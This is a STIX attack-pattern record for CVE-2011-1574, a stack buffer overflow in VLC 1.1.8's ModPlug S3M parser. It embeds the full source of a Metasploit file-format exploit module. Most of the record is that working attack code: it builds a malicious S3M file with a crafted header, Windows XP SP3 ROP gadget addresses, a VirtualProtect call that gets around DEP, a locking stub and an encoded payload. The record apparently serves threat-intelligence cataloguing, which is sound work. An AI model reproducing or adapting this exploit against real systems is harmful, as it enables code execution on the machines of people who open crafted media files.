{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--44933a5e-ba86-4416-8444-1c5b839b7f8d",
    "created": "2024-08-14T16:36:32.030449Z",
    "modified": "2024-08-14T16:36:32.030453Z",
    "name": "VideoLAN VLC ModPlug ReadS3M Stack Buffer Overflow",
    "description": " This module exploits an input validation error in libmod_plugin as included with VideoLAN VLC 1.1.8. All versions prior to version 1.1.9 are affected. By creating a malicious S3M file, a remote attacker could execute arbitrary code.  Although other products that bundle libmodplug may be vulnerable, this module was only tested against VLC.  NOTE: As of July 1st, 2010, VLC now calls SetProcessDEPPoly to permanently enable NX support on machines that support it. As such this module is capable of bypassing DEP, but not ASLR.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/vlc_modplug_s3m.rb",
            "external_id": "vlc_modplug_s3m.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1574"
        },
        {
            "source_name": "reference",
            "url": "http://modplug-xmms.git.sourceforge.net/git/gitweb.cgi?p=modplug-xmms/modplug-xmms;a=commitdiff;h=aecef259828a89bb00c2e6f78e89de7363b2237b"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2011/Apr/113"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VideoLAN VLC ModPlug ReadS3M Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits an input validation error in libmod_plugin as\n        included with VideoLAN VLC 1.1.8. All versions prior to version 1.1.9\n        are affected. By creating a malicious S3M file, a remote attacker\n        could execute arbitrary code.\n\n        Although other products that bundle libmodplug may be vulnerable, this\n        module was only tested against VLC.\n\n        NOTE: As of July 1st, 2010, VLC now calls SetProcessDEPPoly to\n        permanently enable NX support on machines that support it. As such,\n        this module is capable of bypassing DEP, but not ASLR.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-1574' ],\n          [ 'OSVDB', '72143' ],\n          [ 'URL', 'http://modplug-xmms.git.sourceforge.net/git/gitweb.cgi?p=modplug-xmms/modplug-xmms;a=commitdiff;h=aecef259828a89bb00c2e6f78e89de7363b2237b' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2011/Apr/113' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'\t\t=> 512 - 0x24, # Space reserved for prepended mutex code\n          #'DisableNops'\t=> true,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'VLC 1.1.8 on Windows XP SP3',\n            {\n              # vuln is in libmod_plugin.dll, rop is custom to this module\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-04-07', # \"found: 2011-03-09\"\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.s3m']),\n      ])\n  end\n\n  def exploit\n\n    num_orders = 0x14\n    num_instru = 0x15\n    num_patterns = 0x18\n\n    hdr = \"\\x00\" * 0x1c # song name (none)\n    hdr << [\n      0x1a,   # static byte\n      0x10,   # ST3 module\n      0x00,   # padding\n      num_orders,\n      num_instru,\n      num_patterns,\n      0x00,   # Flags\n      0x1320, # Created with (which tracker)\n      0x02,   # File format information\n    ].pack('CCvvvvvvv')\n    hdr << \"SCRM\"\n\n    hdr << [\n      0x40, # global volume\n      0x06, # initial speed\n      0x8a, # initial tempo\n      0xb0, # master volume\n      0x10, # ultra click removal\n      0xfb  # NOTE, non-0xfc value skips an additional loop!\n      # 0xfc == default channel pan positions present\n    ].pack('CCCCCC')\n    hdr << \"\\x00\" * 10  # includes pad and special pointer\n\n    # channel settings (for 32 channels)\n    hdr << \"\\x00\\x08\\x01\\x09\\x02\\x0a\\x03\\x0b\\x04\\x0c\\x05\\x0d\\x06\\x0e\\x07\\x0f\"\n    hdr << \"\\xff\" * 16\n\n    # orders\n    hdr << \"\\x07\\x08\\x0c\\x09\\x0a\\x0b\\x0b\\x0d\\x0e\\x0f\\x0f\\x0f\\x10\\x11\\x12\\x13\"\n    hdr << \"\\x14\\x16\\x17\\xff\"\n\n    # parapointers to instruments\n    hdr << [ 0x0f ].pack('v') * num_instru\n\n    # parapoitners to patterns\n    hdr << [ 0x78 ].pack('v') * num_patterns\n\n    # channel default pan positions\n    hdr << \"\\x00\" * 32\n\n    # instruments\n    instru = \"\\x01metasplo.ity\"\n    rest = \"\\x00\" * ((0x50 * num_instru) - instru.length)\n\n    # Build the rop stack\n    rvas = rvas_libmod_plugin_xpsp3()\n    rop = generate_rop(rvas)\n    zero_ptr = rva2addr(rvas, 'Scratch') + 4\n    mutex_addr = rva2addr(rvas, 'Scratch') + 8\n    imp_Sleep = rva2addr(rvas, 'imp_Sleep')\n\n    # A mutex to prevent double payloads\n    locking_code = <<-EOS\n  mov ebx, [ #{imp_Sleep} ]\n  jmp test_lock\n\nsleep:\n  push 0xdeadbeef\n  call ebx\n\ntest_lock:\n  mov eax, [ #{mutex_addr} ]\n  test eax,eax\n  jnz sleep\n\n  lock cmpxchg [ #{mutex_addr} ], ebp\n  test eax,eax\n  jnz sleep\n\nEOS\n    rop << Metasm::Shellcode.assemble(Metasm::Ia32.new, locking_code).encode_string\n    rop << payload.encoded\n\n    # This becomes the new EIP (after return)\n    ret = rva2addr(rvas, 'pop eax / ret')\n    rest[1267, 4] = [ ret ].pack('V')\n\n    # In order to force return, we smash the this ptr on the stack and point\n    # it so that m_nChannels turns out to be 0.\n    rest[1271, 4] = [ zero_ptr - 0xe910 ].pack('V')\n\n    # Add the ROP stack and final payload here\n    rest[1275, rop.length] = rop\n    instru << rest\n\n    # patterns\n    patt = [ 0x10 ].pack('v')\n    patt << \"\\x00\" * 0x10\n\n\n    # finalize the file\n    s3m = \"\"\n    s3m << hdr\n\n    instru_pad = (0x0f * 0x10) - hdr.length\n    s3m << \"\\x80\" * instru_pad\n    s3m << instru\n\n\n    # patch in exploit trigger values\n    s3m[0x22, 2] = [ 0x220 ].pack('v')\n    s3m[0x24, 2] = [ 0x220 ].pack('v')\n\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(s3m)\n\n  end\n\n  def rvas_libmod_plugin_xpsp3()\n    # libmod_plugin.dll from VLC 1.1.8 (Win32)\n    # Just return this hash\n    {\n      # Used as 'Ret' for target\n      'ret'                    => 0x1022,\n      'push eax / ret'         => 0x1cc4d,\n      'pop eax / ret'          => 0x598a2,\n      'mov eax, [eax+0x1c] / ret' => 0x542c9,\n      'pop ebx / pop ebp / ret' => 0x25e2f,\n      'add eax, 4 / pop ebp / ret' => 0x7028,\n      'mov [eax+0x58], ebx / pop ebx / pop esi / pop edi / pop ebp / ret' => 0x23dad,\n      'sub eax, ebx / pop ebx / pop edi / pop ebp / ret' => 0x7d64,\n    }\n  end\n\n  def generate_rop(rvas)\n    # ROP fun! (XP SP3 English, Apr 10 2011)\n    rvas.merge!({\n      # Instructions / Name    => RVA\n      'BaseAddress'            => 0x653c0000,\n      'imp_VirtualProtect'     => 0xec2f0 - 0x1c,  # adjust for gadget used to resolve\n      'imp_Sleep'              => 0xec2dc,\n      'Scratch'                => 0x5fbfc,\n      'Data'                   => 0x60101,\n      #'DataAdjusted'           => 0x60000 - 0x58 + 0x8,\n      'DataAdjusted'           => 0x60000 - 0x58,\n    })\n\n    copy_stage = <<-EOS\n  nop\n  push esp\n  pop esi\n  lea edi, [eax+0x10]\n  push 0x7f\n  pop ecx\n  inc ecx\n  rep movsd\nEOS\n    copy_stage = Metasm::Shellcode.assemble(Metasm::Ia32.new, copy_stage).encode_string\n    if (copy_stage.length % 4) > 0\n      fail_with(Failure::Unknown, \"The copy stage is invalid\")\n    end\n\n    rop_stack = [\n      # Resolve VirtualProtect\n      'pop eax / ret',\n      'imp_VirtualProtect',\n      'mov eax, [eax+0x1c] / ret',\n\n      # Call VirtuaProtect\n      'push eax / ret',\n      'pop eax / ret',   # after VirtualProtect\n      # Args to VirtualProtect\n      'Data',      # lpAddress (place holder, filled in @ runtime above)\n      0x1000,      # dwSize\n      0x40,        # flNewProtect\n      'Scratch',   # lpflOldProtect\n\n      # Load the pre-adjusted Data addr\n      'DataAdjusted', # matches pop eax / ret above\n\n      ##\n      # Write our code little stager to our newly executable memory.\n      ##\n\n      # Load the last 32-bits of code to write\n      'pop ebx / pop ebp / ret',\n      copy_stage[0, 4].unpack('V').first,\n      :unused, # ebp\n\n      # Write & advance\n      'mov [eax+0x58], ebx / pop ebx / pop esi / pop edi / pop ebp / ret',\n      copy_stage[4, 4].unpack('V').first,\n      :unused, # esi\n      :unused, # edi\n      :unused, # ebp\n      'add eax, 4 / pop ebp / ret',\n      :unused, # ebp\n\n      # Write & advance\n      'mov [eax+0x58], ebx / pop ebx / pop esi / pop edi / pop ebp / ret',\n      copy_stage[8, 4].unpack('V').first,\n      :unused, # esi\n      :unused, # edi\n      :unused, # ebp\n      'add eax, 4 / pop ebp / ret',\n      :unused, # ebp\n\n      # Write & advance\n      'mov [eax+0x58], ebx / pop ebx / pop esi / pop edi / pop ebp / ret',\n      0xffffffb0,  # adjustment value\n      :unused, # esi\n      :unused, # edi\n      :unused, # ebp\n\n      # Adjust eax\n      'sub eax, ebx / pop ebx / pop edi / pop ebp / ret',\n      :unused, # ebx\n      :unused, # edi\n      :unused, # ebp\n\n      # Execute the copy stage\n      'push eax / ret',\n    ]\n\n    rop_stack.map! { |e|\n      if e.kind_of? String\n        # Meta-replace (RVA)\n        fail_with(Failure::Unknown, \"Unable to locate key: \\\"#{e}\\\"\") if not rvas[e]\n        rvas['BaseAddress'] + rvas[e]\n\n      elsif e == :unused\n        # Randomize\n        rand_text(4).unpack('V').first\n\n      else\n        # Literal\n        e\n      end\n    }\n\n    rop_stack.pack('V*')\n  end\n\n  def rva2addr(rvas, key)\n    fail_with(Failure::Unknown, \"Unable to locate key: \\\"#{key}\\\"\") if not rvas[key]\n    rvas['BaseAddress'] + rvas[key]\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-04-07, # \"found: 2011-03-09\"",
    "x_mitre_platforms": [
        "win'"
    ]
}